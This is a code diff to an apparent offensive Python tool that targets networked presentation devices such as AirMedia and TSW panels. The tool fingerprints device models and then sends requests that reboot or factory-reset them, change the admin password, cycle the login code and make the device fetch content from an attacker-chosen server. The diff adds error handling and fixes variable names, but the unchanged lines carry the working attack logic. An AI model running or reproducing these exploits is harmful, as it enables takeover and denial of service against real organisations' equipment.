@@ -65,13 +65,28 @@ def model_type(hosts):
 	for host in hosts:
 		#Test for tws760 url
 		tswURL = "http://" + host + "/webView/CommonUI"
-		tswTest = requests.get(tswURL, verify=False)
+		try:
+			tswTest = requests.get(tswURL, verify=False)
+		except requests.exceptions.RequestException as e:
+			tswTest = "Nope"
+			print("An Error Occured When Connecting")
+
 		#Test for the original projector we found
 		theOGurl = "http://" + host + "/cgi-bin/login.cgi?lang=en&src=AwLoginDownload.html"
-		theOGTest = requests.get(theOGurl, verify=False)
+		try:
+			theOGTest = requests.get(theOGurl, verify=False)
+		except requests.exceptions.RequestException as e:
+			theOGTest = "Nope"
+			print("An Error Occured When Connecting")
+
 		#Test for air2media version
 		air2url = "http://" + host + "/index_airmedia.html"
-		air2Test = requests.get(air2url, verify=False)
+		try:
+			air2Test = requests.get(air2url, verify=False)
+		except requests.exceptions.RequestException as e:
+			air2Test = "Nope"
+			print("An Error Occured When Connecting")
+
 		#Verify a unique string found in the air2media version
 		if "var present_timeout = 1000;" in air2Test.text:
 			print(host + " is a AirMedia2")
@@ -93,9 +108,9 @@ def model_type(hosts):
 
 #Perform a login to the OG version
 def og_Login(host,username,password):
-
+	print(host)
 	#URL of Projector
-	url="https://" + host + "/cgi-bin/login.cgi?lang=en&src=AwLoginAdmin.html"
+	urlF="https://" + host + "/cgi-bin/login.cgi?lang=en&src=AwLoginAdmin.html"
 
 	#POST Data
 	data = {
@@ -107,7 +122,10 @@ def og_Login(host,username,password):
 	}
 
 	#Send Login Request
-	login = requests.post(url = url, data = data, verify=False)
+	try:
+		login = requests.post(url=urlF, data = data, verify=False)
+	except requests.exceptions.RequestException as e:
+		print("An Error Occured When Connecting")
 
 	#Pull Out Cookie So You Can Keep Making Requests
 	cookieStart=login.text.split("document.write(\"<form name=\'form0\' action=\'/cgi-bin/reboot.cgi?lang=en&")
@@ -122,7 +140,11 @@ def reboot(host,model,username,password):
 		#Payload
 		Data = {"Device": {"DeviceOperations": {"Reboot": "true"}}}
 		#Send Requeste
-		reboot = requests.post(url="http://" + host + "/Device/DeviceOperations", json=Data, verify=False)
+		try:
+			reboot = requests.post(url="http://" + host + "/Device/DeviceOperations", json=Data, verify=False)
+		except requests.exceptions.RequestException as e:
+			print("An Error Occured When Connecting")
+
 	elif model == 'OG':
 		cookie = og_Login(host,username,password)
 		#Target URL
@@ -132,7 +154,10 @@ def reboot(host,model,username,password):
 			"command" :	"<Send><seid>" + cookie + "</seid><Factory>reboot</Factory></Send>"
 		}
 		#Send Request
-		reboot = requests.post(url=url,data=data, verify=False)
+		try:
+			reboot = requests.post(url=url,data=data, verify=False)
+		except requests.exceptions.RequestException as e:
+			print("An Error Occured When Connecting")
 
 		print("Reboot Incoming")
 	else:
@@ -144,7 +169,10 @@ def restore(host,model):
 		#Payload
 		Data = {"Device": {"DeviceOperations": {"Restore": "true"}}}
 		#Send Request
-		restore = requests.post(url="http://" + host + "/Device/DeviceOperations", json=Data, verify=False)
+		try:
+			restore = requests.post(url="http://" + host + "/Device/DeviceOperations", json=Data, verify=False)
+		except requests.exceptions.RequestException as e:
+			print("An Error Occured When Connecting")
 	else:
 		pass
 #This code will  change the password of a projector.
@@ -154,10 +182,14 @@ def change_pass(host, username, password, newpass):
 	url = "https://"+ host + "/cgi-bin/return.cgi"
 	#Payload
 	data = {
-		"command" : "<Send><seid>" + cookie + "</seid><name>LONG_ADMIN_PWD</name><value>" + newPass + "</value></Send>"
+		"command" : "<Send><seid>" + cookie + "</seid><name>LONG_ADMIN_PWD</name><value>" + newpass + "</value></Send>"
 	}
 	#Send Request
-	changePass = requests.post(url=url,data=data, verify=False)
+	try:
+		changePass = requests.post(url=url,data=data, verify=False)
+	except requests.exceptions.RequestException as e:
+		print("An Error Occured When Connecting")
+
 	print("Password Change Request Sent")
 
 #This code is a POC
@@ -169,10 +201,14 @@ def web_dos(host,username,password,webserver):
 	url = "https://"+ host + "/cgi-bin/return.cgi"
 	#Payload
 	data = {
-		"command" : "<Send><seid>" + cookie + "</seid><upload><protocol>http</protocol><address>" + webserver + "</address><logo>TheWeb.png</logo></upload></Send>"
+		"command" : "<Send><seid>" + cookie + "</seid><upload><protocol>http</protocol><address>" + webserver + "</address><logo>index.jpg</logo></upload></Send>"
 	}
 	#Send Request
-	webdos = requests.post(url=url,data=data, verify=False)
+	try:
+		webdos = requests.post(url=url,data=data, verify=False)
+	except requests.exceptions.RequestException as e:
+		print("An Error Occured When Connecting")
+
 	print("Web Request Sent")
 
 #This code will begin cycling through various connect codes.
@@ -190,7 +226,11 @@ def code_cycle(host,username,password):
 				'command' : '<Send><seid>' + cookie + '</seid><name>PREF_LOGINCODE</name><value>2</value><name>PREF_UNIVERSAL_LOGINCODE</name><value>' + str(randomInt) + '</value></Send>'
 			}
 			#Send Request
-			cycle = requests.post(url=url,data=data, verify=False)
+			try:
+				cycle = requests.post(url=url,data=data, verify=False)
+			except requests.exceptions.RequestException as e:
+				print("An Error Occured When Connecting")
+
 			print("Cycle")
 	except KeyboardInterrupt:
     		pass
